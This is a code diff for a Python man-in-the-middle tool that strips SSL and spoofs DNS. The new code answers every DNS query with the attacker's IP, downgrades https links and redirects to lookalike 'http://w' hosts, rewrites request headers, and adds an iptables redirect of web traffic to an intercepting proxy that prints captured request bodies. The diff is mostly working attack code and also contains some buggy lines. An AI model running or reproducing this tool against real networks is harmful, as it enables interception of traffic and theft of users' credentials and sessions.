@@ -53,7 +53,7 @@ import struct
 from time import sleep
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
-from core.proxy2 import *
+from core.proxy import *
 from collections import deque
 
 class SSLStripRequestHandler(ProxyRequestHandler):
@@ -61,13 +61,28 @@ class SSLStripRequestHandler(ProxyRequestHandler):
     def request_handler(self, req, req_body):
 	print "\n-----------------------------[Request]--------------------------------"
 	if req.headers:
-		print "[+]Original Headers:"
+		modified = False
+		print "[+] Original Headers:"
 		print req.headers
+		try:
+			if req.headers['Referer'].startswith("http://wwww"):
+				req.headers['Referer'] = "https://www." + req.headers['Referer'].split(".",1)[1]
+		except:
+			pass
+		try:
+			if req.headers['Host'].startswith("wwww"):
+				req.headers['Host'] = str(req.headers['Host'])[1:]
+				modified = True
+		except:
+			pass
+		if modified:
+			print "[+] Modified Headers: "
+			print req.headers
 	if req_body:
 		print "\n[+]Original Body:"
 		print req_body
         if req.path in self.replaced_urls:
-            req.path = req.path.replace('http://', 'https://w')
+            	req.path = req.path.replace('http://', 'https://w')
 	print "\n----------------------------------------------------------------------"
 
     def response_handler(self, req, req_body, res, res_body):
@@ -77,6 +92,10 @@ class SSLStripRequestHandler(ProxyRequestHandler):
 		print "\n[+] Original Headers:"
 		print res.headers
 		print
+		for h in res.headers:
+			if "https://" in res.headers[h]:
+				res.headers[h].replace("https://","http://w")
+				modified = True
 		try:
 			res.headers['Location'] = res.headers['Location'].replace("https://","http://w")
 			replaced_urls.append(res.headers['Location'])
@@ -191,17 +210,14 @@ class SSLKiller(object):
 			if not pkt.haslayer(DNSQR):
 				packet.accept()
 			else:
-				if pkt[DNSQR].qname.startswith("wwww"):
-					host = pkt[DNSQR].qname[1:]
-					ip = socket.gethostbyname(host)
-		        		new_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
-                               		  	  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
-                               	          	  DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
-                               	          	  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=ip))
-                             		packet.set_payload(str(new_pkt))
-                               		packet.accept()
-				else:
-					packet.accept()
+				print "[+]DNS Poisoning {} --> {}".format(pkt[DNS].qd.qname, self.hostIP)
+	                	new_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
+        	                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+        	                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
+        	                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.hostIP))
+        	                packet.set_payload(str(new_pkt))
+				packet.accept()
+
 		def DnsThread():
 			t = threading.Thread(name='DNSspoof', target=DnsPoison)
 			t.setDaemon(True)
@@ -236,7 +252,7 @@ if __name__ == "__main__":
 		sslkill = SSLKiller(interface, target, gateway)
 		os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080")
 		Proxy(HandlerClass=SSLStripRequestHandler)
-
+		Proxy(HandlerClass=SSLStripRequestHandler)
 	except KeyboardInterrupt:
 		print "[!] Aborted..."
                 os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
